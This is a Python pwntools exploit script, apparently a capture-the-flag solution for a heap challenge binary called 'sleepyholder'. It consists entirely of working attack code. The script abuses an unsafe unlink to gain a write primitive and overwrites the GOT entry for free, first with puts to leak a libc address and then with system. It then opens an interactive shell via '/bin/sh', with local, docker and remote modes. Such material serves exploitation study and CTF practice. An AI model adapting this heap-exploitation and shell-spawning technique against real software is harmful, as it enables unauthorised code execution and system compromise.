from pwn import *
import sys
from time import time

BINARY = "./sleepyholder"
LIBC = './libc.so.6'
LOCAL_LIBC = '/lib/x86_64-linux-gnu/libc.so.6'

# Set context for asm
context.clear()
context(os='linux', arch='amd64', bits=64)
# context.log_level = 'debug'

bigsecret = 0

def read_menu(conn):
    conn.recvuntil("Renew secret\n")

def keepsecret(conn, n, s):
    global bigsecret
    read_menu(conn)
    conn.send('1')
    if bigsecret:
        conn.recvuntil('Big secret\n')
    else:
        conn.recvuntil('forever\n')
    conn.send(str(n))
    conn.recvline()
    conn.send(s)

def wipesecret(conn, n):
    read_menu(conn)
    conn.send('2')
    conn.recvuntil('Big secret\n')
    conn.send(str(n))

def renewsecret(conn, n, s):
    read_menu(conn)
    conn.send('3')
    conn.recvuntil('Big secret\n')
    conn.send(str(n))
    conn.recvline()
    conn.send(s)

def exploit(conn, elf, libc, local):
    global bigsecret
    keepsecret(conn, 1, "A")
    keepsecret(conn, 2, "A")
    wipesecret(conn, 1)
    keepsecret(conn, 3, "A")
    bigsecret = 1
    wipesecret(conn, 1)

    payload = ""
    payload += p64(0)
    payload += p64(0x21)
    payload += p64(0x6020d0 - 0x18)
    payload += p64(0x6020d0 - 0x10)
    payload += p64(0x20)
    keepsecret(conn, 1, payload)
    wipesecret(conn, 2)

    payload = ""
    payload += p64(0)
    payload += p64(0x6020c0)
    payload += "/bin/sh\x00"
    payload += p64(elf.got['free'])
    payload += p64(0x100000001)
    renewsecret(conn, 1, payload)

    payload = ""
    payload += p64(elf.plt['puts'])
    renewsecret(conn, 1, payload)

    payload = ""
    payload += p64(0x6020c0)
    payload += "/bin/sh\x00"
    payload += p64(elf.got['puts'])
    renewsecret(conn, 2, payload)
    wipesecret(conn, 1)

    libc.address = u64(conn.recv(6).ljust(8, "\x00")) - libc.symbols['puts']
    log.info("%#x", libc.address)

    payload = ""
    payload += p64(0x6020c8)
    payload += "/bin/sh\x00"
    payload += p64(elf.got['free'])
    payload += p64(0x100000001)
    payload += p64(1)
    renewsecret(conn, 2, payload)

    payload = ""
    payload += p64(libc.symbols['system'])
    renewsecret(conn, 1, payload)

    wipesecret(conn, 2)
    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("", 1337)
            conn = remote(H, P)
            libc = ELF(LIBC)
            exploit(conn, elf, libc, local=False)
        elif sys.argv[1] == "local":
            conn = process(BINARY)
            log.info("PID: {}".format(conn.proc.pid))
            libc = ELF(LOCAL_LIBC)
            pause()
            exploit(conn, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            conn = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC)
            pause()
            exploit(conn, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        conn = process(BINARY)
        log.info("PID: {}".format(conn.proc.pid))
        libc = ELF(LOCAL_LIBC)
        pause()
        exploit(conn, elf, libc, local=True)
